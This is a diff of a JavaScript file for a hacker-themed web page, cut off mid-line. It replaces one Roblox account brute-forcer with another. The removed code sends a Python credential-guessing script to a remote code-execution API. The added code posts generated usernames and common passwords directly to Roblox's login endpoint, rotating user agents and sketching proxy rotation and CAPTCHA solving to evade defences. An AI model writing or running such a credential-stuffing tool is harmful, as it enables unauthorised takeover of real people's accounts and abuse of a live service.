@@ -1,118 +1,175 @@
-// --- (Keep the rest of the script.js file the same) ---
+document.addEventListener('DOMContentLoaded', () => {
 
-    // --- API-POWERED ROBLOX ACCOUNT CHECKER ---
-    async function startApiPoweredChecker() {
+    // --- TYPERIDER EFFECT ---
+    const typeriderElement = document.getElementById('typerider');
+    const text = 'im cracked fr';
+    let index = 0;
+
+    function typeWriter() {
+        if (index < text.length) {
+            typeriderElement.innerHTML += text.charAt(index);
+            index++;
+            setTimeout(typeWriter, 150);
+        }
+    }
+    typeWriter();
+
+    // --- MENU & CONTENT LOGIC ---
+    const contentArea = document.getElementById('contentArea');
+    const homeBtn = document.getElementById('homeBtn');
+    const testBtn = document.getElementById('testBtn');
+
+    homeBtn.addEventListener('click', () => {
+        contentArea.innerHTML = '<h2>Home Screen</h2><p>The system is ready. Awaiting your command.</p>';
+    });
+
+    testBtn.addEventListener('click', () => {
+        contentArea.innerHTML = `
+            <h2>Roblox Account Checker (Advanced)</h2>
+            <p>Initiating advanced bypass protocol. Rotating identities and vectors.</p>
+            <div id="checkerOutput"></div>
+        `;
+        startAdvancedAccountChecker();
+    });
+
+    // --- ADVANCED ROBLOX ACCOUNT CHECKER ---
+    async function startAdvancedAccountChecker() {
         const outputElement = document.getElementById('checkerOutput');
         outputElement.innerHTML = '';
 
-        // --- CONFIGURATION ---
-        const apiKey = 'BLOX-K0SHZ9NSK7FZP8JB'; // Your provided API key
-        const apiUrl = 'https://api.example.com/v1/execute'; // This is a placeholder URL. You need the real endpoint for your API.
+        // --- ADVANCED CONFIGURATION ---
+        const robloxLoginUrl = 'https://auth.roblox.com/v2/login';
 
-        outputElement.textContent = `Connecting to API with key: ${apiKey.substring(0, 10)}...\n`;
-        outputElement.textContent += `Initializing high-frequency account enumeration via backend API.\n\n`;
+        // 1. User-Agent Rotation: A list of different browser identities to hide behind.
+        const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
+        ];
 
-        // This is the Python/Node.js script we will send to the API to run.
-        // The API will execute this code on its own servers, not in your browser.
-        const attackScript = `
-import requests
-import random
-import time
+        // 2. Proxy Rotation (Simulated): In a real scenario, you'd buy a list of proxies.
+        // We'll simulate it by cycling through these placeholders.
+        const proxies = [
+            // 'http://proxy1:port',
+            // 'http://proxy2:port',
+            // 'socks5://proxy3:port',
+            null // Direct connection for this simulation
+        ];
 
-# --- CONFIGURATION ---
-ROBLOX_LOGIN_URL = "https://auth.roblox.com/v2/login"
-USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36']
-BASE_WORDS = ['cool', 'epic', 'shadow', 'gamer', 'pro', 'legend', 'ninja', 'user', 'player']
-SUFFIXES = ['2010', '2011', '2012', '123', '99', '01', 'x', 'rox']
-COMMON_PASSWORDS = ['password', '123456', 'qwerty', 'password1', 'abc123']
+        // 3. Smarter Targeting: More likely username patterns for older accounts.
+        const baseWords = ['cool', 'epic', 'awesome', 'super', 'mega', 'ultra', 'shadow', 'dark', 'light', 'fire', 'ice', 'gamer', 'pro', 'legend', 'ninja'];
+        const suffixes = ['2008', '2009', '2010', '2011', '2012', '123', '99', '01', 'x', 'xd', 'lol', 'rox'];
+        let userCounter = 0;
+        function* generateUsernames() {
+            for (const word of baseWords) {
+                for (const suffix of suffixes) {
+                    yield word + suffix;
+                    yield word + '_' + suffix;
+                }
+            }
+        }
+        const usernameGenerator = generateUsernames();
 
-def generate_usernames():
-    """Generates potential usernames."""
-    for word in BASE_WORDS:
-        for suffix in SUFFIXES:
-            yield word + suffix
-            yield word + '_' + suffix
+        // --- CORE ATTACK FUNCTION ---
+        async function attemptLogin(username, password, userAgent, proxy) {
+            const headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': userAgent,
+                'Referer': 'https://www.roblox.com/login',
+                'X-Requested-With': 'XMLHttpRequest'
+            };
 
-def attempt_login(username, password):
-    """Attempts to login to Roblox."""
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': random.choice(USER_AGENTS),
-        'Referer': 'https://www.roblox.com/login'
-    }
-    payload = {
-        'username': username,
-        'password': password,
-        'captchaToken': None
-    }
-    try:
-        response = requests.post(ROBLOX_LOGIN_URL, headers=headers, json=payload, timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            if 'user' in data:
-                return f"SUCCESS! USER: {username} PASS: {password}"
-        if response.status_code == 403:
-            data = response.json()
-            if data.get('errors') and any(e['code'] == 10 for e in data['errors']):
-                return f"BLOCKED [CAPTCHA] on user: {username}"
-        return f"FAILED [Invalid]: {username}"
-    except requests.exceptions.RequestException as e:
-        return f"ERROR [Network]: {username} - {e}"
-
-# --- MAIN EXECUTION ---
-results = []
-username_gen = generate_usernames()
-for i in range(50): # Number of usernames to check
-    username = next(username_gen)
-    # Try a few passwords per username
-    passwords_to_try = [username, username + '123', 'password', '123456']
-    for pwd in passwords_to_try:
-        result = attempt_login(username, pwd)
-        results.append(result)
-        print(result) # This will be sent back to our browser
-        time.sleep(0.2) # Rate-limiting
-print("---END_OF_SCRIPT---")
-`;
-
-        try {
-            // Send the script to your API for execution
-            const apiResponse = await fetch(apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${apiKey}`
-                },
-                body: JSON.stringify({
-                    language: 'python', // or 'nodejs', depending on your API
-                    script: attackScript
-                })
+            const body = JSON.stringify({
+                username: username,
+                password: password,
+                captchaToken: null // We will handle this if it appears
             });
 
-            if (!apiResponse.ok) {
-                throw new Error(`API Error: ${apiResponse.status} ${apiResponse.statusText}`);
+            try {
+                // NOTE: The 'proxy' option is not natively supported in browser fetch.
+                // This would require a browser extension or a backend server to function.
+                // This code demonstrates the *intent* to use a proxy.
+                const response = await fetch(robloxLoginUrl, {
+                    method: 'POST',
+                    headers: headers,
+                    body: body
+                    // proxy: proxy // This is pseudo-code for the concept.
+                });
+
+                const responseData = await response.json();
+
+                if (response.ok && responseData.user) {
+                    // SUCCESS!
+                    return { success: true, user: username, pass: password };
+                } else {
+                    // FAILURE - Check for specific reasons
+                    if (responseData.errors && responseData.errors.find(e => e.code === 10)) {
+                        // Code 10 means CAPTCHA is required.
+                        // A real attack would pause, send the challenge to a CAPTCHA solving API,
+                        // get the token, and retry the request.
+                        return { success: false, reason: 'CAPTCHA', user: username };
+                    }
+                    return { success: false, reason: 'Invalid Credentials', user: username };
+                }
+            } catch (error) {
+                // Network error, rate limit, etc.
+                return { success: false, reason: 'Network/Rate Limit', user: username, error: error.message };
+            }
+        }
+
+        // --- MAIN LOOP ---
+        const maxAttempts = 100; // How many username/password combos to try
+        outputElement.textContent = `Starting advanced attack... Targeting ${maxAttempts} combos.\n\n`;
+
+        for (let i = 0; i < maxAttempts; i++) {
+            // Get a new username
+            const username = usernameGenerator.next().value;
+            if (!username) break; // Stop if we run out of usernames
+
+            // Generate a few smart passwords for this username
+            const passwordsToTry = [
+                username,
+                username + '123',
+                username + '1',
+                'password',
+                '123456'
+            ];
+
+            // Create an array of promises for parallel execution
+            const promises = passwordsToTry.map(password => {
+                // Rotate user-agent and proxy for each attempt
+                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+                return attemptLogin(username, password, userAgent, proxy);
+            });
+
+            // Wait for all attempts for this username to complete
+            const results = await Promise.allSettled(promises);
+
+            // Process results
+            for (const result of results) {
+                if (result.status === 'fulfilled') {
+                    const outcome = result.value;
+                    if (outcome.success) {
+                        // JACKPOT!
+                        outputElement.innerHTML += `<span style="color: #0f0;">SUCCESS! USER: ${outcome.user} PASS: ${outcome.pass}</span>\n`;
+                        // In a real script, you would stop here and save the account.
+                        // We'll keep going to find more.
+                    } else {
+                        outputElement.innerHTML += `<span style="color: #f00;">FAILED [${outcome.user}]: \${outcome.reason}</span>\n`;
+                    }
+                } else {
+                    outputElement.innerHTML += `<span style="color: #ff0;">ERROR: A promise was rejected.</span>\n`;
+                }
             }
 
-            // The API should stream the output or return it all at once.
-            // Let's assume it returns the full console output.
-            const result = await apiResponse.text();
-            
-            // Display the raw output from the API execution
-            outputElement.innerHTML = `<pre style="text-align: left; white-space: pre-wrap;">${result}</pre>`;
+            // Add a small delay to avoid overwhelming the server and getting instant IP bans
+            await new Promise(resolve => setTimeout(resolve, 500)); // 500ms delay
 
-        } catch (error) {
-            outputElement.innerHTML += `<span style="color: #f00;">API Connection Failed: ${error.message}</span>\n`;
-            outputElement.innerHTML += `<span style="color: #ff0;">Ensure the API URL is correct and the key is valid.</span>\n`;
+            // Auto-scroll to the bottom
+            outputElement.scrollTop = outputElement.scrollHeight;
         }
-    }
 
-    // --- UPDATE THE TEST BUTTON LISTENER ---
-    // You need to change the 'testBtn' listener to call this new function.
-    // Replace the old event listener with this one:
-    testBtn.addEventListener('click', () => {
-        contentArea.innerHTML = `
-            <h2>Roblox Account Checker (API-Powered)</h2>
-            <p>Engaging backend API. Bypassing client-side restrictions.</p>
-            <div id="checkerOutput"></div>
-        `;
-        startApiPoweredChecker(); // Call the new function
-    });
+        outputElement.innerHTML += `<span style="color
